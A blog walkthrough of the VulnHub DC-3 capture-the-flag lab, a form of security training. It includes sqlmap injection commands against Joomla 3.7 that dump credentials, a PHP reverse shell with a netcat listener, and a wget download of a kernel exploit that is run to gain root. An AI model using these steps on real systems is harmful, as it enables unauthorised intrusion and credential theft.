@@ -1,0 +1,87 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">DC-3 Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/dc-3-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-05-05T16:11:57+00:00">May 5, 2019</time><time class="updated" datetime="2025-06-10T20:12:04+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Hello friends! Today we are going to take another boot2root challenge known as “DC-3”. The credit for making this VM machine goes to “DCAU” and it is another boot2root challenge in which our goal is to get root access to complete the challenge. You can download it from <a style="color: #000000;" href="https://www.vulnhub.com/entry/dc-32,312/">here</a>.</span></p>
+<p><span style="color: #000000;"><strong>Security Level</strong>: Beginner</span></p>
+<h3><span style="color: #800000;"><strong>Penetrating Methodology:</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">Discovering Targets IP</span></li>
+<li><span style="color: #000000;">Network scanning (Nmap)</span></li>
+<li><span style="color: #000000;">Surfing HTTP service port</span></li>
+<li><span style="color: #000000;">Searching exploits via searchsploit</span></li>
+<li><span style="color: #000000;">Using SQLMAP to dump databases information</span></li>
+<li><span style="color: #000000;">Using John the Ripper to Crack the Password</span></li>
+<li><span style="color: #000000;">Login into JOOMLA</span></li>
+<li><span style="color: #000000;">Inject malicious PHP Reverse Shell Code</span></li>
+<li><span style="color: #000000;">Using Netcat for obtaining reverse connection</span></li>
+<li><span style="color: #000000;">Exploit the kernel</span></li>
+<li><span style="color: #000000;">Getting root access</span></li>
+<li><span style="color: #000000;">Reading Final flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Walkthrough</strong></span></p>
+<p><span style="color: #000000;">Let’s start off with scanning the network to find our target.</span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-cO0pJZlGMjs/XM8JMkUZT6I/AAAAAAAAeO8/WAvQQ-AD7hYWz-R8YkJE13mFsxRnB4aJQCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">We found our Targets IP Address 192.168.1.104; Our next step is to scan our targets IP Address with nmap.</span></p>
+<pre class="lang:default decode:true">nmap -A 192.168.1.104</pre>
+<p><span style="color: #000000;">From nmap result we found only HTTP service is running on port 80 and we got to know that JOOMLA CMS is installed on this website.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-t9cm3k3_GNo/XM8JN8wpe4I/AAAAAAAAePI/yUjEvICl4hQNQQ3GCz3L2GpNnWFWY8BhACLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">So, we navigate to port 80 by exploring target IP in the web browser and read the text message of the admin, moreover the website was running on Joomla CMS as found above.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZxLUcRLgJa0/XM8JODUNb9I/AAAAAAAAePM/SC7AXtK5PbgxzsY1cMqCRpidNknNZyF1wCLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">So to identify installed Joomla version, we checked its Readme file. We can clearly come to know about the version of Joomla 3.7, I think this is might come in handy.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yPr-Se2FmKw/XM8JOoMt-0I/AAAAAAAAePQ/AnAc0jOo5D0FeLp8urXJydlHszQWLARvQCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;"><strong> </strong></span></p>
+<p><span style="color: #000000;">We looked for <strong>Joomla 3.7</strong> in <strong>searchsploi</strong>t and found <strong>JOOMLA SQL INJECTION exploit</strong>. We copied the exploits <strong>42033.txt</strong> file on our machine and read it contents. It revealed a <strong>Command for Sqlmap</strong> along with a vulnerable URL.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-etOlNZdp_3k/XM8JOytqC2I/AAAAAAAAePU/Z5ZVQf1AQDsSEtUI4uyPHVCXFob14m8jwCLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">Then we executed given below sqlmap command and with the help of it we look for the Database names that revealed database 5 entries as shown in the image given below where I notice joomladb.</span></p>
+<pre class="lang:default decode:true">sqlmap -u "http://192.168.1.104/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-k3Nj_p4Zz4s/XM8JPBwvZpI/AAAAAAAAePY/Y90JvnDQWb0gOUJR2DXpoHJbC4tHL2OEgCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">Let’s again use Sqlmap to look for the tables and column.</span></p>
+<pre class="lang:default decode:true">sqlmap -u "http://192.168.1.104/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables --batch</pre>
+<p><span style="color: #000000;">After getting the table names, we have dumped the contents of table <strong>#_users</strong> using sqlmap, which revealed credentials which that come in handy to log into JOOMLA. But the password is encoded, we need to crack it. Time to fire up John up.</span></p>
+<pre class="lang:default decode:true">sqlmap -u "http://192.168.1.104/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C name,password --dump --batch</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LNF3CTT4klg/XM8JPXyoTeI/AAAAAAAAePc/Pvf1fEHM8Hwop13-CpcKMV0wwBguPDTTwCLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">We have saved the hash in our system and use john the ripper to crack the hash. Now we have both the credentials to log into Joomla.</span></p>
+<pre class="lang:default decode:true">Username- admin
+Password- snoopy</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7eM27al8_qg/XM8JPpdPkoI/AAAAAAAAePg/Tl7xftkVLuQ14RwP7S6HeRs8HwJzXhSTwCLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">Let’s login into Joomla as admin.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yJHBFwHW-e8/XM8JP-4d1TI/AAAAAAAAePk/uA4G9bsqO7cNSST37c479XtXfzfkY-P-gCLcBGAs/s1600/8_2.png"/></span></p>
+<p><span style="color: #000000;">After spending some time exploring, we got an idea to add a malicious PHP code (available inside kali: /usr/share/webshells/php) in <strong>index.php of beez3 template</strong> for getting reverse shell as shown below.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-fRpnEPC1yzA/XM8JQs1XmNI/AAAAAAAAePo/qMDcD--wa1UoWzvSWwnw9geLxp_w2ZJVwCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">On the other side, we set up a netcat listener. Upon Execution, we got the shell of the target system. To get a proper shell, we have used the python one-liner to spawn the TTY shell.</span></p>
+<pre class="lang:default decode:true">nc -lvp 1234
+python -c 'import pty;pty.spawn("/bin/bash")'
+uname -a
+lsb_release -a</pre>
+<p><span style="color: #000000;">From the LSB description, we clearly knew for this version of Ubuntu has a direct exploit which can be used to get the root access and found our final flag.</span></p>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://3.bp.blogspot.com/-yTH8ET6Q5yQ/XM8JMypV9_I/AAAAAAAAePA/nXbw8y_eVxcZZCNsk_xDOV7W5-6VrQWWwCLcBGAs/s1600/10.png"/></strong></span></p>
+<p><span style="color: #000000;">Without wasting time, we found a privilege escalation exploit for ubuntu 16.04. We have downloaded it and extracted it.</span></p>
+<pre class="lang:default decode:true">cd /tmp
+wget https://www.exploit-db.com/exploits/39772
+unzip 39722.zip
+ls
+cd 39772
+ls
+tar -xvf exploit.tar</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-vGqRzzMTwPg/XM8JMhFcnBI/AAAAAAAAeO4/3OJw4cygRxA66zt4-Pjq5C6PdbxkZeMBQCLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">After running the exploit, we have easily got the root access and thus got our Final flag.</span></p>
+<pre class="lang:default decode:true">ls 
+cd ebpf_mapfd_doubleput_exploit
+ls
+./compile.sh
+ls
+./doubleput
+cd root
+ls
+cat the-flag.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-p4JHRzJAoWw/XM8JNwSPJrI/AAAAAAAAePE/Jph9BR-3PuwSXYVRCyyMB46baXU0n3ezwCLcBGAs/s1600/12.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author:</strong> Ashray Gupta is a Security Researcher and Technical Writer at Hacking Articles. Contributing his 3 years in the field of security as a Penetration Tester and Forensic Computer Analyst. Contact <strong><a style="color: #000000;" href="https://www.linkedin.com/in/ashray-gupta-b77221b6/">Here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
